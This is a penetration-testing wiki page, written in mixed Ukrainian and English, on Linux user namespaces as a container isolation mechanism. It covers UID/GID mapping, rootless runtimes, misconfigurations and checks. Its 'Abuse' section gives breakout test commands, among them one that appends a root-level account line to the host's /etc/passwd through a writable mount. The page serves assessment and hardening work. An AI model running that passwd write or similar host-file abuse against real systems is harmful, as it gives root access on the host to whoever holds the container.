# Простір імен користувача

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен користувача змінює значення ідентифікаторів користувачів та груп, дозволяючи ядру відображати ID, які бачаться всередині простору імен, на інші ID поза ним. Це один з найважливіших сучасних механізмів захисту контейнерів, оскільки він безпосередньо вирішує найбільшу історичну проблему класичних контейнерів: **root inside the container used to be uncomfortably close to root on the host**.

З просторами імен користувача процес може виконуватись як UID 0 всередині контейнера й водночас відповідати непривілейованому діапазону UID на хості. Це означає, що процес може поводитись як root для багатьох завдань всередині контейнера, одночасно будучи значно менш потужним з точки зору хоста. Це не вирішує всі проблеми безпеки контейнерів, але суттєво змінює наслідки компрометації контейнера.

## Принцип роботи

Простір імен користувача має файли відображень, такі як `/proc/self/uid_map` та `/proc/self/gid_map`, які описують, як ID простору імен транслюються в батьківські ID. Якщо root всередині простору імен відображається на непривілейований UID хоста, то операції, які вимагали б реального root на хості, просто не мають тієї самої ваги. Саме тому простори імен користувача є центральними для **rootless containers** і чому вони є однією з найбільших відмінностей між старішими контейнерами з root за замовчуванням і більш сучасними дизайнами з мінімальними привілеями.

Сутність тонка, але критична: root всередині контейнера не знищується, він **перетворюється**. Процес все ще відчуває локально середовище, схоже на root, але хост не повинен трактувати його як повного root.

## Лаб

Ручний тест:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Це змушує поточного користувача виглядати як root всередині простору імен, при цьому зовні, поза ним, він все ще не є host root. Це один із найкращих простих прикладів для розуміння того, чому простори імен користувачів такі цінні.

У контейнерах ви можете порівняти видиме відображення з:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Точний вивід залежить від того, чи використовує engine user namespace remapping, чи більш традиційну rootful конфігурацію.

Ви також можете прочитати відображення з боку хоста за допомогою:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Використання під час виконання

Rootless Podman є одним із найяскравіших прикладів того, що простори імен користувачів розглядаються як механізм безпеки першого класу. Rootless Docker також покладається на них. Підтримка userns-remap у Docker також підвищує безпеку в розгортаннях з rootful daemon, хоча історично багато розгортань залишали її вимкненою через сумісність. Підтримка простору імен користувачів у Kubernetes покращилася, але впровадження та налаштування за замовчуванням різняться залежно від runtime, дистрибутива та політики кластера. Системи Incus/LXC також активно покладаються на зміщення UID/GID та ідеї idmapping.

## Розширені деталі відображення

Коли непривілейований процес записує в `uid_map` або `gid_map`, ядро застосовує суворіші правила, ніж до записувача в привілейованому батьківському namespace. Дозволені лише обмежені відображення, і для `gid_map` записувачу зазвичай потрібно спочатку відключити `setgroups(2)`:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
This detail matters because it explains why user-namespace setup sometimes fails in rootless experiments and why runtimes need careful helper logic around UID/GID delegation.

Another advanced feature is the **ID-mapped mount**. Instead of changing on-disk ownership, an ID-mapped mount applies a user-namespace mapping to a mount so that ownership appears translated through that mount view. This is especially relevant in rootless and modern runtime setups because it allows shared host paths to be used without recursive `chown` operations. Security-wise, the feature changes how writable a bind mount appears from inside the namespace, even though it does not rewrite the underlying filesystem metadata.

Finally, remember that when a process creates or enters a new user namespace, it receives a full capability set **inside that namespace**. That does not mean it suddenly gained host-global power. It means those capabilities can be used only where the namespace model and other protections allow them. This is the reason `unshare -U` can suddenly make mounting or namespace-local privileged operations possible without directly making the host root boundary disappear.

## Misconfigurations

The major weakness is simply not using user namespaces in environments where they would be feasible. If container root maps too directly to host root, writable host mounts and privileged kernel operations become much more dangerous. Another problem is forcing host user namespace sharing or disabling remapping for compatibility without recognizing how much that changes the trust boundary.

User namespaces also need to be considered together with the rest of the model. Even when they are active, a broad runtime API exposure or a very weak runtime configuration can still allow privilege escalation through other paths. But without them, many old breakout classes become much easier to exploit.

## Abuse

If the container is rootful without user namespace separation, a writable host bind mount becomes vastly more dangerous because the process may really be writing as host root. Dangerous capabilities likewise become more meaningful. The attacker no longer needs to fight as hard against the translation boundary because the translation boundary barely exists.

User namespace presence or absence should be checked early when evaluating a container breakout path. It does not answer every question, but it immediately shows whether "root in container" has direct host relevance.

The most practical abuse pattern is to confirm the mapping and then immediately test whether host-mounted content is writable with host-relevant privileges:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Якщо файл створено як реальний host root, user namespace isolation фактично відсутня для цього шляху. У цей момент класичні host-file abuses стають реалістичними:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Більш безпечним підтвердженням під час live assessment є запис безпечного маркера замість зміни критичних файлів:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ці перевірки важливі, бо швидко відповідають на ключове питання: чи відповідає root у цьому контейнері root на хості настільки, щоб записуване хостове монтування відразу ставало шляхом компрометації хоста?

### Повний приклад: відновлення локальних привілеїв у просторі імен

Якщо seccomp дозволяє `unshare` і середовище дозволяє створити новий користувацький простір імен, процес може відновити повний набір привілеїв усередині цього нового простору імен:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Саме по собі це не є host escape. Причина, чому це важливо, полягає в тому, що user namespaces можуть знову дозволити привілейовані namespace-local дії, які згодом поєднуються зі слабкими mounts, вразливими kernels або погано захищеними runtime surfaces.

## Checks

Ці команди призначені, щоб відповісти на найважливіше питання на цій сторінці: який обліковий запис на host відповідає root всередині цього container?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- Якщо процес має UID 0 і maps показують пряме або дуже близьке host-root mapping, container набагато небезпечніший.
- Якщо root maps до unprivileged host range, це значно безпечніша базова лінія і зазвичай вказує на реальну user namespace isolation.
- Mapping файли цінніші, ніж `id` сам по собі, оскільки `id` показує лише namespace-local identity.

Якщо workload запускається як UID 0 і mapping показує, що це близько відповідає host root, слід набагато суворіше оцінювати решту привілеїв container.
{{#include ../../../../../banners/hacktricks-training.md}}
